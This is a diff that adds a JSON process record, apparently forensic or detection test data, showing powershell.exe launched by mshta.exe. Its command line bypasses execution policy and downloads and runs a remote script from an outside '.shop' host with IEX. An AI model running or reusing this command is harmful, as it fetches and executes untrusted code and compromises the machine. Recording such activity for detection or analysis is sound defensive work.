@@ -1,0 +1,9 @@
+[
+  {
+    "pid": 6216,
+    "name": "powershell.exe",
+    "parent": "mshta.exe",
+    "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "cmdline": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX ((New-Object Net.WebClient).DownloadString('https://deduhko.klipzyroloo.shop/Grpc.eml'))"
+  }
+]
